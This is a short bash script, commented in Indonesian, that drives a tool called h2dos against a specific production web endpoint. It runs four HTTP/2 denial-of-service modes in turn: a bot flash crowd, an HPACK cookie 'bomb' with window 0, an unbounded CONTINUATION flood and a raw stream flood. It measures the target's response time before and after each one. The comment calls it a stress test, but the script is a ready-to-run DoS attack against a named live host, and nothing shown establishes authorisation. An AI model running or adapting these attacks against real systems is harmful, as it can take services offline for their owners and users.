#!/bin/bash
# Uji tekanan ke target produksi, tiap modus diukur dengan probe mandiri.
T=https://9router-production-a2ff.up.railway.app
P="/dashboard/quota"
FLAGS="-probe $P -probe-fresh -probe-interval 1s -probe-fail 4 -stop-on-down=false -report 5s"

jalankan() {
  nama="$1"; shift
  echo "=================================================="
  echo "### $nama  ($(date +%H:%M:%S))"
  curl -sk -m 10 -o /dev/null -w "sebelum: HTTP %{http_code} ttfb=%{time_starttransfer}s\n" $T$P
  /tmp/h2dos -target $T$P "$@" $FLAGS 2>&1 | tail -14
  sleep 2
  curl -sk -m 10 -o /dev/null -w "sesudah: HTTP %{http_code} ttfb=%{time_starttransfer}s\n" $T$P
}

jalankan "bot 150 koneksi, jeda 100ms (flash crowd)" \
  -mode bot -conns 150 -bot-think 100ms -bot-jitter 120ms -bot-reuse 30 -dur 60s
sleep 165

jalankan "bomb (HTTP/2 Bomb, cookie crumb, window 0)" \
  -mode bomb -conns 80 -bomb-name cookie -bomb-refs 8192 -dur 60s
sleep 165

jalankan "contflood (CONTINUATION tanpa batas)" \
  -mode contflood -conns 40 -dur 45s
sleep 165

jalankan "flood (throughput maksimal)" \
  -mode flood -conns 12 -streams 120 -batch 32 -dur 30s
echo "=================================================="
echo "SELESAI $(date +%H:%M:%S)"
